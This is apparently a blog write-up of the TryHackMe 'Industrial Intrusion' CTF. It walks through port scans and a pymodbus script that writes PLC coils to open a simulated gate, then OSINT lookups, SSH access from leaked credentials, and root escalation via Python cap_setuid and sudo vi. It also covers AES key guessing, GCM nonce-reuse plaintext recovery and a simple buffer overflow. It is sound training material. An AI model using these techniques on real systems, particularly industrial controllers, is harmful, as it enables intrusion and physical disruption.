---
layout: post
title: Industrial Intrusion CTF
date: 2025-07-04 22:05 +0300
categories: [CTF,THM]
tags: [CTF,THM, write-up]
---

# Industrial Intrusion CTF
link: [Industrial Intrusion CTF](https://tryhackme.com/room/industrial-intrusion)

## Breach
![](https://i.imgur.com/ORmXjhz.png)

After deploying the machine i got the ip: `10.10.184.62`.

Scanning the ip of the machine:

```
nmap -sS -p- -O -sV 10.10.184.62
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-29 12:42 EDT
Nmap scan report for 10.10.184.62
Host is up (0.071s latency).
Not shown: 65528 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http          Werkzeug httpd 3.1.3 (Python 3.12.3)
102/tcp   open  iso-tsap      Siemens S7 PLC
502/tcp   open  modbus        Modbus TCP
1880/tcp  open  vsat-control?
8080/tcp  open  http          Werkzeug httpd 2.3.7 (Python 3.12.3)
44818/tcp open  EtherNetIP-2?

1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
*** service fingerprint ***

Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: OS: Linux; Device: specialized; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 210.82 seconds

```

There is a lot to cover up, let's start visiting the site of the ip (port 80).
![](https://i.imgur.com/jcABMtJ.png)

We can see a simple site with a image of close gate that we need to find a way to open.

let's look at the devtools to get more information:
![](https://i.imgur.com/mWAyQHd.png)

There is no hidden html or comments, but we see a script that call for `http://10.10.184.62:80/api/gate` to get the status of the gate.

After that we can go to `http://10.10.184.62:1880/` and we are greeted with Node-RED flow.
![](https://i.imgur.com/6BRck5o.png)

We can see two flows:

Read Coils 20-30:
![](https://i.imgur.com/6J39ziH.png)
This is a `modbus-read node` - that node connects to a Modbus server, periodically reads specific registers/coils Emits the data as a Node-RED msg object (typically under msg.payload).

we also can see what Modbus server that node connect to:
![](https://i.imgur.com/u0IuuDQ.png)
the server is `localhost:502`, we also saw that server on the nmap scan, so that mean we can send data to that Modbus server to interact with the flow.

After each `modbus-read node` we have functions:

function 1:
```
if (!msg.payload || !Array.isArray(msg.payload.data)) {
    node.warn("❌ No coil data available");
    return null;
}

const bits = msg.payload.data;

for (let i = 0; i < bits.length; i++) {
    if (bits[i]) {
        node.warn(`✅ Coil ${i} is TRUE`);
    }
}

// Output to motion and badge checker UI
return [
    { payload: bits[20] },   // Motion Detector (coil 20)
  
];
```

After the function we have a switch node:
![](https://i.imgur.com/9RfWh9V.png)

And a Modbus-Write node:
![](https://i.imgur.com/nzn9NDB.png)

flow 2:

Same `modbus-read node` Read Coils 20-30

function 2:
```
if (!msg.payload || !Array.isArray(msg.payload.data)) {
    node.warn("❌ No coil data available");
    return null;
}

const bits = msg.payload.data;

for (let i = 0; i < bits.length; i++) {
    if (bits[i]) {
        node.warn(`✅ Coil ${i} is TRUE`);
    }
}

// Output to badge checker UI
return [
    { payload: bits[25] },   
  
];
```

Switch node:
![](https://i.imgur.com/9RfWh9V.png)

Modbus-Write node:
![](https://i.imgur.com/dOgSwrT.png)

Another helpful feature in Node-RED is the debug panel:
![](https://i.imgur.com/el95hIy.png)

With the debugger open we can see that while the flows are active `Coil 25` and `Coil 20` are `True`.

Armed with all this information let's open the gate:
We need to send `10.10.184.62:502` data to turn `Coil 25` and `Coil 20` are off.

for that i wrote a scrip in python using pymodbus lib:
coil.py:
```
import argparse
from pymodbus.client import ModbusTcpClient

MODBUS_HOST = '10.10.184.62'  
MODBUS_PORT = 502              

def write_coil(client, coil_num, value):
    write_result = client.write_coil(coil_num, value)
    if write_result.isError():
        print(f"❌ Error writing coil {coil_num}.")
    else:
        print(f"✅ Coil {coil_num} set to {value}.")

def activate_coil(coil_num, value):
    client = ModbusTcpClient(MODBUS_HOST, port=MODBUS_PORT)

    try:
        if not client.connect():
            print("❌ Failed to connect to Modbus device.")
            return

        write_coil(client, coil_num, value)

    finally:
        client.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Write a value to a Modbus coil.")
    parser.add_argument('--coil', type=int, required=True, help='Coil number to write.')
    parser.add_argument('--value', type=str, choices=['true', 'false'], default='false',
                        help='Value to write to the coil (true/false). Default is false.')

    args = parser.parse_args()

    coil_number = args.coil
    coil_value = True if args.value.lower() == 'true' else False

    activate_coil(coil_number, coil_value)

```

let's try it and see what happened:
![](https://i.imgur.com/l4GePzO.png)

After setting Coil 20 and 25 to False we see that the debugger say Coil 30 is True.

Going back to the gate we can see that now it is open and we have the flag:
![](https://i.imgur.com/JMcJ5q3.png)

🚩~flag found~🚩

## discord
![](https://i.imgur.com/N1rNdB5.png)

After joining the discord server and opening the #ctf-discord-challenge we can see at the topic the command `/secret-function`
using it in the chat give us the flag:
![](https://i.imgur.com/HqTnZjE.png)
![](https://i.imgur.com/Slpvcao.png)

🚩~flag found~🚩

## OSINT 1
![](https://i.imgur.com/Vq31CPn.png)

visiting `virelia-water.it.com` nothing seems out of the ordinary:
![](https://i.imgur.com/7jUwiXU.png)


searching subdomains using virustotal:
![](https://i.imgur.com/JduRxtQ.png)

we can see virustotal found a subdomain: `stage0.virelia-water.it.com`, using using `https://who.is/` reviled some more information about that subdomain:
![](https://i.imgur.com/JjbpQ3u.png)
We can see that the subdomain used to be `solstice-teach1.github.io` thats a site that hosted on Github using GitHub Pages (like this one 😊).
and from that we can understand that `solstice-teach1` is a github user:
![](https://i.imgur.com/dzptilO.png)

looking around in the user projects we found this html code:
![](https://i.imgur.com/uFxsp9I.png)

this url looks kinda weird, using CyberChef to convert from hex we get the flag:
![](https://i.imgur.com/0QqagUF.png)

Alternative way is to use `crt.sh` to find the Certificates history of `virelia-water.it.com` and we can see the url with hex flag.
![](https://i.imgur.com/BT13XR5.png)

🚩~flag found~🚩

## OSINT 2
![](https://i.imgur.com/JisTj8i.png)

Looking around the github user projects we found in OSINT 1 we found a url that lead us to another github user:
![](https://i.imgur.com/SdZ25o9.png)
![](https://i.imgur.com/PaVJqQS.png)

And going inside this user project we can see a fallback_dns url:
![](https://i.imgur.com/80F2kXM.png)

Using VirusTotal to get more info about this url reveals a TXT record:
![](https://i.imgur.com/RpUVUH4.png)

Using CyberChef to decode from Base64 reveal the flag:
![](https://i.imgur.com/ywTWNVb.png)

🚩~flag found~🚩

## OSINT 3
![](https://i.imgur.com/NcxGKXd.png)

Looking into the OT Alerts, the site give back a 404 error that the alert is no longer available so we need to find it somewhere else.
![](https://i.imgur.com/R1Prkgd.png)

using `https://who.is/` reviled some more information about `virelia-water.it.com`, We can see that the site used to be `virelia-water.github.io` thats a site that hosted on Github using GitHub Pages.
and from that we can understand that `virelia-water` is a github user:
![](https://i.imgur.com/kx8Jw6m.png)
![](https://i.imgur.com/yAHV2RQ.png)

using the commit history we can find the alert and the mysterious PGP.
![](https://i.imgur.com/al516Xv.png)

the OT-Alert:
```
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="robots" content="index,follow">
  <title>OT Alerts Exceptions – June 2025</title>
  <link rel="stylesheet" href="/styles.css">
</head>
<body>
  <header><h1>OT Alerts Exception Report – June 2025</h1></header>
  <nav>
    <a href="/">Home</a>
    <a href="/mail-archives/">Archives Home</a>
    <a href="/policies/">Compliance Policies</a>
  </nav>
  <main>
    <p>This page lists <em>exceptional</em> OT-Alert messages for June 2025 only. Routine alerts have been redacted.</p>
    <div class="message">
      <div class="hdr">
        From: DarkPulse &lt;alerts@virelia-water.it.com&gt;<br>
        Date: Mon, 15 Jun 2025 02:15:00 +0000<br>
        Subject: Scheduled OT Calibration
      </div>
      <pre>
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

Please confirm system integrity at 03:00 UTC.
-----BEGIN PGP SIGNATURE-----

iQFQBAEBCgA6FiEEiN7ee3MFE71e3W2fpPD+sISjEeUFAmhZTEQcHGFsZXJ0c0B2
aXJlbGlhLXdhdGVyLml0LmNvbQAKCRCk8P6whKMR5ZIUCADM7F0WpKWWyj4WUdoL
6yrJfJfmUKgJD+8K1neFosG7yaz+MspYxIlbKUek/VFhHZnaG2NRjn6BpfPSxfEk
uvWNIP8rMVEv32vpqhCJ26pwrkAaUHlcPWqM4KYoAn4eEOeHCvxHNJBFnmWI5PBF
pXbj7s6DhyZEHUmTo4JK2OZmiISP3OsHW8O8iz5JLUrA/qw9LCjY8PK79UoceRwW
tJj9pVsE+TKPcFb/EDzqGmBH8GB1ki532/1/GDU+iivYSiRjxWks/ZYPu/bhktTo
NNcOzgEfuSekkQAz+CiclXwEcLQb219TqcS3plnaO672kCV4t5MUCLvkXL5/kHms
Sh5H
=jdL7
-----END PGP SIGNATURE-----
      </pre>
    </div>
  </main>
  <footer>&copy; 2025 Virelia Water Control Facility</footer>
</body>
</html>
```

The PHP SIGNATURE:
```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

Please confirm system integrity at 03:00 UTC.
-----BEGIN PGP SIGNATURE-----

iQFQBAEBCgA6FiEEiN7ee3MFE71e3W2fpPD+sISjEeUFAmhZTEQcHGFsZXJ0c0B2
aXJlbGlhLXdhdGVyLml0LmNvbQAKCRCk8P6whKMR5ZIUCADM7F0WpKWWyj4WUdoL
6yrJfJfmUKgJD+8K1neFosG7yaz+MspYxIlbKUek/VFhHZnaG2NRjn6BpfPSxfEk
uvWNIP8rMVEv32vpqhCJ26pwrkAaUHlcPWqM4KYoAn4eEOeHCvxHNJBFnmWI5PBF
pXbj7s6DhyZEHUmTo4JK2OZmiISP3OsHW8O8iz5JLUrA/qw9LCjY8PK79UoceRwW
tJj9pVsE+TKPcFb/EDzqGmBH8GB1ki532/1/GDU+iivYSiRjxWks/ZYPu/bhktTo
NNcOzgEfuSekkQAz+CiclXwEcLQb219TqcS3plnaO672kCV4t5MUCLvkXL5/kHms
Sh5H
=jdL7
-----END PGP SIGNATURE-----
```

using the signature we can find the RSA key/fingerprint of the pgp signature and look it up using `keyserver.ubuntu.com` to find the flag:
![](https://i.imgur.com/VOGIRSv.png)

🚩~flag found~🚩

## Chess Industry (Boot2root 1)
![](https://i.imgur.com/FnOa7D4.png)

### What is the content of user.txt?
Scanning the ip:
```
$> nmap -sS -p- -O -sV 10.10.151.237
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-29 16:08 EDT
Nmap scan report for 10.10.151.237
Host is up (0.071s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
79/tcp open  finger  Debian fingerd
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.19 seconds

```

visiting the site show a simple page with no hidden comments or html and no backend requests:
![](https://i.imgur.com/wA2o5CJ.png)

The scan show the `finger` protocol open on port 79 - `The finger protocol, an older internet protocol designed to retrieve information about users on a remote computer. It's primarily used to show who is logged in and potentially some basic details about their session.`
So we can use it to find more information about the users of that machine:
```
$> finger magnus@10.10.151.237
Login: magnus                           Name: 
Directory: /home/magnus                 Shell: /bin/bash
Never logged in.
No mail.
No Plan.

$> finger fabiano@10.10.151.237 
Login: fabiano                          Name: 
Directory: /home/fabiano                Shell: /bin/bash
Never logged in.
No mail.
Project:
Reminders
Plan:
ZmFiaWFubzpvM2pWVGt0YXJHUUkwN3E=

$> finger hikaru@10.10.151.237                                                      
Login: hikaru                           Name: 
Directory: /home/hikaru                 Shell: /bin/bash
Never logged in.
No mail.
Project:
http://localhost
Plan:
Working on AI chess bot for King's Square Chess Club.
```
Using the names from the main page gave us a foothold, using CyberChef for the base64 message from the `fabiano` user we decode a username and password for the ssh service and after login we found the first flag:
![](https://i.imgur.com/12aMFd1.png)
```
$> ssh fabiano@10.10.151.237 
fabiano@10.10.151.237's password:*********
```
![](https://i.imgur.com/PKiFsaL.png)

🚩~flag found~🚩

### What is the content of root.txt?
using `linpeas (https://github.com/peass-ng/PEASS-ng)` to find a way to escalate our privileges, first getting the script to the attacker machine and copy it to the target machine:
```
$> wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

$> scp linpeas.sh fabiano@10.10.151.237:/
```
and running the script on the target:
```
fabiano@tryhackme-2204:~$ chmod +x linpeas.sh 
fabiano@tryhackme-2204:~$ ./linpeas.sh 
```
`linpeas` found a high lever PE (Privilege Escalation) vector:
![](https://i.imgur.com/zWbFffv.png)

Normally, Python runs as user. But with `cap_setuid=ep`, it can switch to **any UID** — including **root (UID 0)**.

alternative way to find this is to use `getcap`:
```
$> getcap -r / 2>/dev/null
```

with that we can get a root privilege by using python to set uid to 0 (root) and spawn a shell:
![](https://i.imgur.com/FyYz3yR.png)

🚩~flag found~🚩

## Under Construction (Boot2Root 2)
![](https://i.imgur.com/NZfWxf6.png)

### What is the content of user.txt?
First let's scan the machine:
```
$> nmap -sS -p- -O -sV 10.10.8.113  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-29 16:23 EDT
Nmap scan report for 10.10.8.113
Host is up (0.073s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.11 seconds
```

Vising the site show a simple site, by changing the pages we can see a potential LFI (Local File Inclusion).
![](https://i.imgur.com/QvKEyC6.png)
![](https://i.imgur.com/d1SxHuO.png)

using ffuf to uncover hidden paths found /keys/ and inside the folder we can see that `key_09` have some data, opening it show a private openssh key:
![](https://i.imgur.com/XOl6PoL.png)
![](https://i.imgur.com/qJtFwhl.png)
![](https://i.imgur.com/jvPv1ed.png)

Now that we have a key, we need a user to use it with on the ssh, using the LFI from the webserver we can find the `passwd` file, and from it get the user: `dev`:
![](https://i.imgur.com/1WmZ5SF.png)

using the user:`dev` and the openssh key let us connect to the machine using ssh:
```
$> ssh -i key_09 dev@10.10.8.113
```
![](https://i.imgur.com/T3r7CYz.png)

🚩~flag found~🚩

### What is the content of root.txt?
using `sudo -l` to list which commands we are allowed to execute as root:
![](https://i.imgur.com/02pkanP.png)

we can run `vi` as root, and using vi to spawn a shell we can get a root:
```
$> sudo /usr/bin/vi
```
inside vi:
```
:!bash
```
This will open a shell (`bash`) running as root.
Alternatively, if `bash` isn’t available, we can try:
```
:!sh
```
![](https://i.imgur.com/XLB65x6.png)

🚩~flag found~🚩

## No Salt, No Shame (Crypto 1)
![](https://i.imgur.com/9N5rP8D.png)

So after downloading the file, to get the flag we need to decrypt the record
from the challenge description we know:
- Cipher: `AES-CBC`
- passphrase: `VIRELIA-WATER-FAC`
- IV: `all-zero (i.e. 16 bytes of \x00)`
- No salt or integrity checks

AES-CBC with a passphrase suggests we first derive a key from the passphrase. Since the problem mentions “no salt,” they probably just hashed the passphrase directly into the key. A common approach is:
* Key = HASH(passphrase)

Because I don't know what kind of hashing algorithm they use, I wrote a script to try and test some of the most popular hashing algorithms and print out the result:
```
from Crypto.Cipher import AES
from hashlib import md5, sha1, sha224, sha256, sha384, sha512
import sys

HASHES = {
    "md5": md5,
    "sha1": sha1,
    "sha224": sha224,
    "sha256": sha256,
    "sha384": sha384,
    "sha512": sha512,
}

KEY_SIZES = [16, 24, 32]  # AES-128, AES-192, AES-256

PASS_PHRASE = b"VIRELIA-WATER-FAC"
IV = b"\x00" * 16

with open("shutdown.log-1750934543756.enc", "rb") as f:
    ciphertext = f.read()

for hash_name, hash_func in HASHES.items():
    h = hash_func()
    h.update(PASS_PHRASE)
    full_digest = h.digest()

    for key_size in KEY_SIZES:
        key = full_digest[:key_size]

        try:
            cipher = AES.new(key, AES.MODE_CBC, IV)
            plaintext = cipher.decrypt(ciphertext)

            # Attempt to remove PKCS#7 padding
            pad_len = plaintext[-1]
            if pad_len > 0 and pad_len <= 16:
                plaintext_clean = plaintext[:-pad_len]
            else:
                plaintext_clean = plaintext

            print(f"==== {hash_name.upper()} (key size: {key_size} bytes) ====")
            print(plaintext_clean.decode(errors="ignore"))
            print("-" * 60)

        except Exception as e:
            print(f"Error with {hash_name} ({key_size} bytes): {e}")
```
![](https://i.imgur.com/CcGrY0d.png)

by running the script we can see that the hash algorithm was: `sha256`.


🚩~flag found~🚩

## Echoed Streams (Crypto 2)
![](https://i.imgur.com/TLFukgW.png)

This is a classic GCM nonce-reuse attack scenario.
here what we have:
- Two AES-GCM packets, both encrypted under:
    - same AES key
    - same 16-byte nonce

File structure:
```
[16 bytes nonce] || [96 bytes ciphertext] || [16 bytes tag]
```
The first packet plaintext known and fixed:
```
BEGIN TELEMETRY VIRELIA;ID=ZTRX0110393939DC;PUMP1=OFF;VALVE1=CLOSED;PUMP2=ON;VALVE2=CLOSED;END;
```

The second packet plaintext is unknown and contains a kill-switch and the flag.

so how can we solve this and get the flag
`AES-GCM` is a mode of encryption that is stream-based (like a one-time pad)
If you encrypt two messages under the same nonce and same key:
```
C1 = P1 ⊕ keystream
C2 = P2 ⊕ keystream
```
So:
```
C1 ⊕ C2 = P1 ⊕ keystream ⊕ P2 ⊕ keystream = P1 ⊕ P2
```
So:
```
P2 = P1 ⊕ (C1 ⊕ C2)
```
Because you know:
- P1 (the telemetry plaintext)
- C1
- C2

Therefore we can recover P2 without knowing the key!
for doing so i used a python script:
```python
# known telemetry plaintext
p1_plaintext = b"BEGIN TELEMETRY VIRELIA;ID=ZTRX0110393939DC;PUMP1=OFF;VALVE1=CLOSED;PUMP2=ON;VALVE2=CLOSED;END;"

with open("cipher1.bin", "rb") as f:
    data1 = f.read()

with open("cipher2.bin", "rb") as f:
    data2 = f.read()

# parse files
nonce1 = data1[0:16]
c1 = data1[16:112]        # 96 bytes
tag1 = data1[112:128]

nonce2 = data2[0:16]
c2 = data2[16:112]        # 96 bytes
tag2 = data2[112:128]

# check nonce reuse
assert nonce1 == nonce2, "Different nonces, cannot proceed!"

# C1 XOR C2
delta = bytes(a ^ b for a, b in zip(c1, c2))

# P2 = P1 XOR delta
p2 = bytes(a ^ b for a, b in zip(p1_plaintext, delta))

# Print result
print(p2.decode(errors="ignore"))
```

### step 1 - Extract the Ciphertexts:
Each file:
```
[16 bytes nonce][96 bytes ciphertext][16 bytes tag]
```
- Offset 0:16 = nonce
- Offset 16:112 = ciphertext
- Offset 112:128 = GCM tag


### step 2 - Compute P2
Since:
```
P2 = P1 ⊕ (C1 ⊕ C2)
```
Steps:
- extract nonce, c1, c2
- XOR c1 and c2 → ΔC
- XOR ΔC with P1 → recover P2

![](https://i.imgur.com/hWhmtsl.png)

🚩~flag found~🚩

## Start (pwn 1)
![](https://i.imgur.com/1St4g6X.png)

After downloading the file and open it using `Binary-ninja` we can see the source code of the remote server, and find a way to bypass the username validation:
![](https://i.imgur.com/TMsHQ5f.png)

looking at the main we see a var_c the set to 0 and a buf with size 0x2c (44), in the stack we can see that the buf is 44 bytes under the var_c and when we write 45 chars (every char is one byte) we can overwrite the var_c using `buffer overflow` and bypass the if condition

```
            High addresses
          -------------------
          |     ...         |
          -------------------
RSP+0x0 → | Return Address  |
          -------------------
RSP-0x8 → | Saved RBP       |
          -------------------
RSP-0xc → | var_c           |  <--- variable to overwrite
          -------------------
RSP-0x38→ | buf[43]         |
          | buf[42]         |
          | ...             |
          | buf[0]          |
          -------------------
```
Therefore when we send 45 A's we get the flag:

![](https://i.imgur.com/PwZeIZo.png)

🚩~flag found~🚩